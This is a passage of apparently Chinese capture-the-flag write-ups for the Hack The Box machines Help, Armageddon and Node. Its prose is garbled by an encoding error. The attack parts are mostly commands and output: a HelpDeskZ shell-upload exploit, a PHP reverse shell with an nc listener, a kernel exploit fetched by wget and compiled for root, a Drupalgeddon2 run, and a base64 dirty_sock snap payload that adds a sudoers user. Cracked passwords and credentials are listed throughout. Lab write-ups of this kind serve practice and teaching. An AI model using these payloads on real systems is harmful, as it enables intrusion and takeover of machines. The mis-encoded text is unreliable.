æ ¹æ®æ¼æ´ï¼Œå½“å‰åº”è¯¥æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œ sql æ³¨å…¥å°è¯•çš„ï¼Œä¸è¿‡å’±ä»¬å†çœ‹çœ‹æ›´å¤šæ€è·¯ 3000 ç«¯å£ è¿™è¾¹æœ‰ä¸ª 3000 ç«¯å£å¯ä»¥è®¿é—® &quot;Hi Shiv, To get access please find the credentials with given query&quot; è¿™æç¤ºæˆ‘ä»¬ï¼Œæƒ³è¦è·å¾—æƒé™ï¼Œéœ€è¦é€šè¿‡ç»™å®šçš„æŸ¥è¯¢æ‰¾åˆ°ç­”æ¡ˆ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# dirsearch -u &quot;http://10.10.10.121:3000&quot; _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927 Output File: /root/.dirsearch/reports/10.10.10.121-3000/_22-07-01_09-29-39.txt Error Log: /root/.dirsearch/logs/errors-22-07-01_09-29-39.log Target: http://10.10.10.121:3000/ [09:29:40] Starting: [09:33:40] 400 - 18B - /graphql/ [09:33:40] 400 - 18B - /graphql/console/ [09:33:40] 400 - 18B - /graphql Task Completed æ‰¾åˆ°äº†ä¸€ä¸ª &#x2F;graphql ç›®å½•ï¼Œè¿™ä¸ªç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª &#x2F;console ç›®å½•ï¼Œå»è®¿é—®ä¸€ä¸‹ è¿™è¾¹æç¤ºéœ€è¦ä¸€ä¸ª get å‚æ•° query éšä¾¿åŠ ä¸€ä¸ªå‚æ•°åå€’æ˜¯å‡ºæ¥æ•°æ®äº†ï¼Œä½†æ˜¯æç¤ºè¯­æ³•é”™è¯¯ï¼Œå»æ‰¾ä¸€ä¸‹queryç›¸å…³çš„åŠŸèƒ½ æ‰¾åˆ°ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ï¼Œç„¶åè¯»å–åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  æ¼æ´åˆ©ç”¨ å¾—åˆ°è§£å¯†åçš„è´¦å·å¯†ç  username = helpme@helpme.com password = godhelpmeplz åœ¨ 80 ç«¯å£æˆåŠŸç™»å½• æŠŠæ—¶åŒºä¿®æ”¹ä¸ºæˆ‘ä»¬å½“å‰ç¯å¢ƒçš„æ—¶åŒº åœ¨ Submit a Ticket ä¸­å°è¯•ä¸Šä¼ ä¸€ä¸ª php æ–‡ä»¶ è¿™é‡Œæç¤ºä¸Šä¼ å¤±è´¥ï¼Œä½†æ˜¯å…¶å®æ˜¯æˆåŠŸçš„ï¼Œä¸è¿‡ä¼šè¢«ä¿®æ”¹ä¸ºéšæœºæ–‡ä»¶åï¼Œæ‰¾åˆ°å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å»åˆ©ç”¨è„šæœ¬å§ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# python2 40300.py http://help.htb/support/uploads/tickets/ 1.php Helpdeskz v1.0.2 - Unauthenticated shell upload exploit found! http://help.htb/support/uploads/tickets/9d831815c3faa6a961d01bd9dc543aca.php ä¸Šä¼ æˆåŠŸï¼Œå»å°è¯•è®¿é—®çœ‹çœ‹ æˆåŠŸä¸Šä¼ å¹¶ä¸”è®¿é—®æˆåŠŸï¼Œå»åˆ¶ä½œä¸€ä¸ª php çš„ revershell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php ç„¶åå»ç½‘é¡µç«¯ä¸Šä¼ ï¼Œæ¥ç€ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åè¿è¡Œ exploit â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# python2 40300.py http://help.htb/support/uploads/tickets/ phpshell.php Helpdeskz v1.0.2 - Unauthenticated shell upload exploit â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.121] 35558 Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 19:41:30 up 1 day, 9:53, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) /bin/sh: 0: can&#39;t access tty; job control turned off $ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; help@help:/$ id&amp;&amp;whoami id&amp;&amp;whoami uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) help æˆåŠŸå¼¹å› shel cat user.txt 64cf57c35b4e6991534e125790ad0b55 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡é¦–å…ˆä½¿ç”¨ python å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ª linpeas ææƒè¾…åŠ©è„šæœ¬ â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Basic information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• OS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 User &amp; Groups: uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare) Hostname: help Writable folder: /dev/shm [+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /bin/nc is available for network discover &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE è¿™è¾¹çœ‹åˆ°äº†ç³»ç»Ÿç‰ˆæœ¬æ˜¯ ubuntu 4.40ï¼Œå»æœç´¢ä¸‹æ˜¯å¦æœ‰æ¼æ´ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# searchsploit 4.4.0-116 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation | linux/local/44298.c ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results æ‰¾åˆ°ä¸€ä¸ª ä¼ åˆ°æœåŠ¡å™¨å»ï¼Œç„¶åç¼–è¯‘è¿è¡Œ help@help:/tmp$ wget http://10.10.14.9/44298.c wget http://10.10.14.9/44298.c --2022-09-04 20:40:43-- http://10.10.14.9/44298.c Connecting to 10.10.14.9:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5773 (5.6K) [text/x-csrc] Saving to: &#39;44298.c&#39; 44298.c 100%[===================&gt;] 5.64K --.-KB/s in 0s 2022-09-04 20:40:43 (20.3 MB/s) - &#39;44298.c&#39; saved [5773/5773] ä¼ è¾“è¿›æ¥ä»¥åï¼Œå»è¿›è¡Œç¼–è¯‘ help@help:/tmp$ gcc 44298.c -o exploit gcc 44298.c -o exploit æ¥ç€è¿è¡Œ help@help:/tmp$ ./exploit ./exploit task_struct = ffff880037ee8000 uidptr = ffff880036f91084 spawning root shell root@help:/tmp# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help) root@help:/root# cat root.txt cat root.txt 9123b571740b6f2c3b1a7fa657c55f20 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Armageddon - Hackthebox","slug":"Hackthebox - Armageddon","date":"2022-08-04T03:14:26.000Z","updated":"2023-05-20T01:14:30.000Z","comments":true,"path":"2022/08/04/Hackthebox - Armageddon/","link":"","permalink":"http://www.lucifiel.com/2022/08/04/Hackthebox%20-%20Armageddon/","excerpt":"","text":"é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†NMAPé¦–å…ˆä½¿ç”¨ nmap è¿›è¡Œæ‰«æ nmap â€“A -sS â€“sC â€“Sv 10.10.10.233 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å¯äº†22å’Œ80ç«¯å£ åœ¨ 80 ç«¯å£æç¤ºäº†æˆ‘ä»¬å­˜åœ¨ robots.txt æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸œè¥¿å¾ˆå¤š å’±ä»¬è®¿é—®ä¸€ä¸‹ å…¶ä¸­å¼•èµ·æˆ‘å…´è¶£çš„ä¸œè¥¿å‘¢å°±æ˜¯ /MAINTAINERS.txt æ–‡ä»¶äº† è¿™æ˜¯ç»´æŠ¤æ–‡ä»¶ï¼Œæˆ–è€…è¯´æ˜¯å‡çº§æ–‡ä»¶ï¼Œå’±ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹ æœä¸å…¶ç„¶ï¼Œé‡Œé¢æ­éœ²äº†Drupalçš„ç‰ˆæœ¬ åˆ°è¿™é‡Œæ€è·¯å°±æ˜äº†äº† æ¼æ´åˆ©ç”¨å’±ä»¬ç›´æ¥ä½¿ç”¨ msf è¿›è¡Œ getshell ä½¿ç”¨ msfconsole æ‰“å¼€ msf è¾“å…¥search drupalæœç´¢å¯ç”¨çš„exp å’±ä»¬å¯¹æ¯”ä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œæœ€åä¸€æ¬¡å‡çº§ä¸º7.56ç‰ˆæœ¬ï¼Œå‡çº§æ—¶é—´ä¸º2017-06-21 ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¹‹å‰çš„expéƒ½å¯ä»¥ç›´æ¥passäº† å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨ 2018-03-28çš„exp ä¸Š use exploit/unix/webapp/drupal_drupalgeddon2 option set RHOSTS 10.10.10.233 set lhost 10.10.14.135 exploit æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell å’±ä»¬è¿è¡Œä¸€ä¸‹æ— æ³•æŸ¥çœ‹åˆ°uidï¼Œä½†æ˜¯å¯ä»¥æŸ¥çœ‹åˆ°æ–‡ä»¶ ä½†æˆ‘åä¸ï¼Œæˆ‘å°±æƒ³çŸ¥é“å½“å‰ç”¨æˆ·æ€ä¹ˆåŠï¼Ÿ ç®€å• è¾“å…¥ shell ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯å¡ä½äº†ï¼Œä½†åæ¥æƒ³æƒ³ä¸å¯¹ï¼Œå¥½åƒæ˜¯è·å–åˆ°äº† æ‰§è¡Œå‘½ä»¤åç¡®è®¤å‘½ä»¤æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼Ÿ é‚£å’±ä»¬å…ˆæƒ³åŠæ³•è·å¾—ä¸€ä¸ªç¨³å®šçš„shellå§ /bin/bash â€“i ä¸ä¸€æ ·è¢«æˆ‘æåˆ°shelläº†ï¼Œå¯ç»™æˆ‘NBåäº†ï¼Œå‰ä¼šå„¿è…° ç”¨æˆ·æ˜¯apacheï¼Œæƒé™è¿˜æ˜¯æœ‰ç‚¹ä½å•Šï¼Œå’±ä»¬åœ¨å†…æ ¸é‡Œçœ‹åˆ°äº†ä¸€ä¸ªåŸŸåï¼Œæˆ–è®¸æœ‰ç”¨ï¼Œå…ˆè®°å½•ä¸‹æ¥å§ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯å¹²å˜›çš„ï¼Œå’±ä»¬å¾—æƒ³æƒ³åŠæ³•å»æåˆ°æ›´é«˜ä¸€ç‚¹çš„æƒé™ æˆ‘åœ¨æŸ¥çœ‹æºç å’Œé…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨ ..&#x2F;sites&#x2F;default&#x2F;settings.php ä¸­æ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç  database =&gt; drupal username =&gt; drupaluser password =&gt; CQHEy@9M*m23gBVj ä»–ä¸æ˜¯å¼€å¯äº†22ç«¯å£å—ï¼Œå’±ä»¬ç›´æ¥sshç™»å½•å§ å—¯ï¼Ÿå¯†ç ä¸å¯¹ï¼Ÿå•Šè¿™ï¼Œå°±æœ‰ç‚¹å°´å°¬äº†å‘€ æ²¡äº‹å„¿ï¼Œå’±ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œæ—¢ç„¶ä»å¤–é¢æ¥ä¸è¡Œï¼Œé‚£å’±ä»¬å°±ä»é‡Œé¢æ¥ï¼Œå’³å’³ æ²¡å¼€è½¦å“ˆ è¯·ä¸è¦è„‘è¡¥ åœ¨å’±ä»¬çš„ shell é‡Œç›´æ¥ä½¿ç”¨ mysql è¿›è¡Œç™»å½• å¾ˆå¥‡æ€ªï¼Œæ­£å¸¸è¾“å…¥è´¦å·å¯†ç ä¼šå¡ä½æˆ–è€…æŠ¥é”™æˆ–è€…å‡ºç°ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ ç»è¿‡å¤šæ–¹æµ‹è¯•ä»¥åŠæŸ¥æ‰¾èµ„æ–™åï¼Œå¾—å‡ºæ­£ç¡®çš„æŸ¥è¯¢å‘½ä»¤ mysql -u &quot;drupaluser&quot; -h &quot;localhost&quot; &quot;-pCQHEy@9M*m23gBVj&quot; &quot;drupal&quot; -e &quot;select uid, name, pass from users;&quot; brucetherealadmin è´¦æˆ·ä¸€çœ‹è¿™ä¹ˆé•¿å°±çŸ¥é“ä¸ç®€å•ï¼Œä¿—è¯è¯´çš„å¥½ï¼Œé•¿çš„äººä¸€å®šä¸ç®€å•ï¼Œå’‹åŠï¼Ÿçˆ†å®ƒï¼ å°†ç”¨æˆ· brucetherealadmin çš„ hash ä¿å­˜ä¸ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ è¯·å‡ºæˆ‘ä»¬çš„ç¥å™¨john john --wordlist=/usr/share/wordlists/rockyou.txt admin çˆ†ç ´æˆåŠŸ å¯†ç ä¸º booboo ç°åœ¨å’±ä»¬ç›´æ¥sshç™»å½•å°±å¯ä»¥äº† ssh brucetherealadmin@10.10.10.233 OKï¼Œå’±ä»¬ç°åœ¨æ€»ç®—æ˜¯æœ‰ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·æƒé™äº† æˆåŠŸè·å¾—useræƒé™çš„flag æƒé™æå‡ å’±ä»¬ä½¿ç”¨ sudo â€“l æ¥æŸ¥çœ‹ä¸€ä¸‹ sudo æƒé™ å’±ä»¬å¯ä»¥ä¸ä½¿ç”¨å¯†ç å°±è°ƒç”¨ root æƒé™å®‰è£… snapï¼Œé‚£æ€è·¯å°±æœ‰äº†å‘€ï¼Œæèµ·æ¥å…„å¼Ÿä»¬ ç”Ÿæˆä¸€ä¸ªsnapçš„é©¬ å‚è€ƒé“¾æ¥ï¼š Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)ï¼šhttps://shenaniganslabs.io/2019/02/13/Dirty-Sock.html Playing with Dirty Sockï¼šhttps://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html ç”ŸæˆæŒ‡ä»¤ï¼š python2 -c &#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap ç›´æ¥è¿è¡Œæ”¹æ–‡ä»¶ï¼Œå‘ç°è¿˜æœ‰ä¸€ç‚¹é”™è¯¯ï¼Œéœ€è¦æƒ³åŠæ³•è§£å†³ä¸€ä¸‹ åŠ ä¸Š â€“devmode æˆåŠŸå®‰è£… sudo /usr/bin/snap install --devmode exploit.snap åˆ‡æ¢åˆ° dirty_sock ç”¨æˆ·ï¼Œå¯†ç ä¹Ÿæ˜¯ dirty_sock æŸ¥çœ‹ä¸€ä¸‹æƒé™ ææƒæˆåŠŸ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Node - Hackthebox","slug":"Hackthebox - Node","date":"2022-08-01T11:38:36.000Z","updated":"2023-05-20T02:09:27.000Z","comments":true,"path":"2022/08/01/Hackthebox - Node/","link":"","permalink":"http://www.lucifiel.com/2022/08/01/Hackthebox%20-%20Node/","excerpt":"","text":"Hackthebox - Nodeé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 09:40 CST Nmap scan report for 10.10.10.58 Host is up (0.57s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) |_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 3000/tcp open hadoop-tasktracker Apache Hadoop | hadoop-tasktracker-info: |_ Logs: /login |_http-title: MyPlace | hadoop-datanode-info: |_ Logs: /login Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.13 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 3.5 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 647.66 ms 10.10.14.1 2 647.71 ms 10.10.10.58 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.80 seconds Http è¿™è¾¹é¦–é¡µé¢çœ‹åˆ°æœ‰ä¸ªç™»é™†ç‚¹ï¼Œç›´æ¥å»çœ‹çœ‹ æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œæ²¡è¿›å»ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå…¶ä»–å¯ä»¥ç‚¹çš„ç‚¹äº†ï¼Œfuzz ä¹Ÿæ²¡æ‰¾åˆ°ä»€ä¹ˆä¸œè¥¿ åœ¨ä¸»é¡µæŠ“åˆ°ä¸€ä¸ª jsï¼Œé‡Œé¢æœ‰ä¸€ä¸ªåœ°å€ &#x2F;api&#x2F;usersï¼Œå»çœ‹ä¸€ä¸‹ [{&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true}, {&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false}, {&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false}, {&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false}] å»å°è¯•è§£å¯†ä¸€ä¸‹ username = myP14ceAdm1nAcc0uNT password = manchester æˆåŠŸè§£å¯†å‡º myP14ceAdm1nAcc0uNT çš„å¯†ç ï¼Œè¿™æ˜¯ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œå»ç™»é™†é¡µé¢ç™»å½•ä¸€ä¸‹ æ¼æ´åˆ©ç”¨ æˆåŠŸç™»é™†ï¼Œç„¶åæœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œä¸‹è½½ä¸€ä¸‹ wget --header &quot;Cookie: connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ&quot; http://10.10.10.58:3000/api/admin/backup è¿™ä¸ªæ–‡ä»¶ä¸‹è½½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå°è¯•å¤šæ¬¡éƒ½ä¼šåœ¨å¤§æ¦‚ 0.6% å·¦å³çš„è¿›åº¦åœæ­¢ä¸‹è½½ æ‰€ä»¥æˆ‘ä»¬ç”¨ wget è¿›è¡Œè‡ªåŠ¨å¤šæ¬¡å°è¯•ä¸‹è½½ï¼Œç„¶åæŒ‚ç€ç­‰ä¸‹è½½å®Œæˆå§ å¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œå°±å°è¯•ç”¨ curl è¿›è¡Œè¯·æ±‚ curl -s -XGET -b &#39;connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ&#39; http://10.10.10.58:3000/api/admin/backup -o myplace.backup â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# file myplace.backup myplace.backup: ASCII text, with very long lines (64652), with no line terminators æŸ¥çœ‹äº†ä¸€ä¸‹å†…å®¹å’Œç±»å‹ï¼Œæ„Ÿè§‰åƒæ˜¯ base64 ç¼–ç ï¼Œå»è§£ç ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# cat myplace.backup | base64 -d &gt; unknow â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# file unknow unknow: Zip archive data, at least v1.0 to extract, compression method=store â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# mv unknow myplace.zip æ˜¯ä¸€ä¸ª zip ç±»å‹çš„ï¼Œé‚£å°±å°è¯•è§£å‹ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# unzip myplace.zip Archive: myplace.zip creating: var/www/myplace/ [myplace.zip] var/www/myplace/package-lock.json password: éœ€è¦ä¸€ä¸ªè§£å‹å¯†ç  â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip possible pw found: magicword è§£å‹å¯†ç å‡ºæ¥äº†ï¼Œå»è§£å‹ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop/var/www/myplace] â””â”€# ls -la æ€»ç”¨é‡ 56 drwxr-xr-x 4 root root 4096 9æœˆ 3 2017 . drwxr-xr-x 3 root root 4096 7æœˆ 12 20:24 .. -rw-rw-r-- 1 root root 3861 9æœˆ 2 2017 app.html -rw-rw-r-- 1 root root 8058 9æœˆ 3 2017 app.js drwxr-xr-x 69 root root 4096 9æœˆ 2 2017 node_modules -rw-rw-r-- 1 root root 283 9æœˆ 2 2017 package.json -rw-r--r-- 1 root root 21264 9æœˆ 2 2017 package-lock.json drwxrwxr-x 6 root root 4096 9æœˆ 2 2017 static æœ‰ä¸€äº›æ–‡ä»¶ï¼Œåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰æœ‰ç”¨çš„ä¸œè¥¿å§ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop/var/www/myplace] â””â”€# grep -Ri password . ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤è¿›è¡Œç­›é€‰ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ª mongodb â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop/var/www/myplace] â””â”€# cat app.js const express = require(&#39;express&#39;); const session = require(&#39;express-session&#39;); const bodyParser = require(&#39;body-parser&#39;); const crypto = require(&#39;crypto&#39;); const MongoClient = require(&#39;mongodb&#39;).MongoClient; const ObjectID = require(&#39;mongodb&#39;).ObjectID; const path = require(&quot;path&quot;); const spawn = require(&#39;child_process&#39;).spawn; const app = express(); const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;; const backup_key = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;; æŸ¥çœ‹ app.js å…¶ä¸­å’Œ mangodb æœ‰å…³çš„åªæœ‰ const url è¿™ä¸€å¥ æ‰€ä»¥æˆ‘ä»¬åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = mark password = 5AYRft73VtFpc84k ç›®å‰åªæœ‰ 22 å’Œ 3000 ç«¯å£æ‰“å¼€ï¼Œ3000 ç«¯å£æˆ‘ä»¬å·²ç»æ˜¯ admin æƒé™äº†ï¼Œè‡ªç„¶ä¸å¯èƒ½ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ 22 ç«¯å£ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ssh mark@10.10.10.58 The authenticity of host &#39;10.10.10.58 (10.10.10.58)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.58&#39; (ED25519) to the list of known hosts. mark@10.10.10.58&#39;s password: The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. .-. .-&#39;``(|||) ,`\\ \\ `-`. 88 88 / \\ &#39;``-. ` 88 88 .-. , `___: 88 88 88,888, 88 88 ,88888, 88888 88 88 (:::) : ___ 88 88 88 88 88 88 88 88 88 88 88 `-` ` , : 88 